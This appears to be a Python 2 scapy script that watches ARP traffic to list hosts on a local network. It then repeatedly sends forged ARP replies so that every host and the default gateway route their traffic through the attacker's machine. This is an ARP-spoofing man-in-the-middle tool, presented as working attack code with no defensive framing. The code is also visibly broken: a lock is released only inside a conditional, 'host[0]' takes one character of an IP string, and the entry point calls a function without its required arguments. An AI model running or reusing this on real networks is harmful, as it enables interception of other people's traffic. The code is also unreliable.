from multiprocessing import PIPE
from scapy.all import *
from threading import Thread,Lock

#global variables:
localAddresses=list()
addressesLock=Lock()

def add_IP_Address(pkt):
    """
    adds host address to localAddresses (if does not yet exist in the list)
    """
    if pkt[ARP].op == 2: # is-at

        address=pkt[ARP].psrc #extract IP address
        addressesLock.acquire()
        global localAddresses
        if address not in localAddresses: #check for duplicates
            localAddresses.append(address) #add IP address to list of all hosts
            print 'added',address
            addressesLock.release()


def monitor_new_hosts():
    """
    monitors network for any new devices
    """

    sniff(prn=add_IP_Address,filter='arp')


def arpSpoof(router,localHost):
    """
    every 30 seconds send ARP broadcast to spoof all machines on LAN
    """

    while True:
        if len(localAddresses)>0:
            addressesLock.acquire()
            print 'spoofing'
            for host in localAddresses:
                if host != router and host != localHost: #check that ip does not match default gateway or local host to not send packets to them

                    victimPacket = Ether()/ARP(op=2,psrc = router, pdst=host[0])#create arp packets
                    gatewayPacket=Ether()/ARP(op=2,psrc=host[0],pdst=router)

                    sendp(victimPacket)#send packets
                    sendp(gatewayPacket)

            addressesLock.release()
            sleep(30)



def network_monitor(adddrs,defaultGateway,localHost,connection):


    monitorThread=Thread(target=monitor_new_hosts)
    monitorThread.start()
    logging.debug('created thread for monitoring network for new devices')

    arpThread=Thread(target=arpSpoof,args=(defaultGateway,localHost,))
    arpThread.start()
    logging.debug('created thread for ARP spoofing')





if __name__=='__main__':
    network_monitor()
